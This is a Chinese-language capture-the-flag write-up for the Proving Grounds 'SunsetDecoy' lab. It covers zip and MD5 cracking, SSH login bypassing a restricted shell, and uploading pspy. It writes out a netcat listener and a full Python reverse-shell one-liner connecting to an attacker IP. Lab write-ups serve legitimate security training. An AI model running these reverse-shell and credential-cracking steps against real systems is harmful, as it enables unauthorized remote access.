# Proving Grounds-> SunsetDecoy      靶场笔记

下载save.zip

![image-20230421153824435](https://s2.loli.net/2023/04/23/MOu9fEmJGlBqjzV.png)

破解zip密码，github随便找个破解脚本跑一下就行了

解压之后拿到六个文件这六个文件都是etc下面的

![image-20230421154259288](https://s2.loli.net/2023/04/23/axH6MsepLwdD34E.png)

group中找到一个userid 296640a3b825115a47b68fc44501c828

hostname中的md5解开之后是decoy-10

passwd文件中也有找个用户名，密码是md5加密

解密之后是server

ssh登录，屏蔽掉配置文件

ssh 296640a3b825115a47b68fc44501c828@192.168.223.85 -t "bash --noprofile"  

反弹shell

sudo nc -nlvp 9919

/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.5",9919));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'



PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin

scp /home/moon/pspy64 296640a3b825115a47b68fc44501c828@192.168.223.85:/home/296640a3b825115a47b68fc44501c828

192.168.223.85